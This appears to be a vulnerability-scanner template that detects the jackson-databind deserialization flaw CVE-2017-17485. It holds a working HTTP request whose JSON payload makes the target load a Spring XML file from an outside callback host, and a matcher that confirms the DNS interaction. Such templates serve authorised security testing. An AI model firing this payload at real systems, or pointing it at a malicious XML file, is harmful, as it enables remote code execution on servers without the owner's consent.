id: CVE-2017-17485

info:
  name: Jackson-databind
  author: JohnnieWalker
  severity: critical 
  description: FasterXML jackson-databind allows unauthenticated remote code execution because of an incomplete fix for the CVE-2017-7525 deserialization flaw. This is exploitable by sending maliciously crafted JSON input to the readValue method of the ObjectMapper, bypassing a blacklist that is ineffective if the Spring libraries are available in the classpath.
  reference: 
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17485
    - https://nvd.nist.gov/vuln/detail/CVE-2017-17485
    - https://access.redhat.com/security/cve/cve-2017-17485
  classification:
    cve-id: CVE-2017-17485
  tags: cve,cve2017,jackson,databind,deserialization,xml

requests:
  - raw:
      - |
        POST /{{Path}} HTTP/1.1
        Host: {{BaseURL}}
        Accept-Encoding: gzip, deflate
        Accept: */*
        Accept-Language: en
        User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
        Connection: close
        Content-Type: application/json
        Content-Length: 138

        {
          "{{word}}": [
            "org.springframework.context.support.FileSystemXmlApplicationContext",
            "http://{{interactsh-url}}/spel.xml"
          ]
        }

    payloads:
      word : word_list.txt   

    matchers:
      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns" 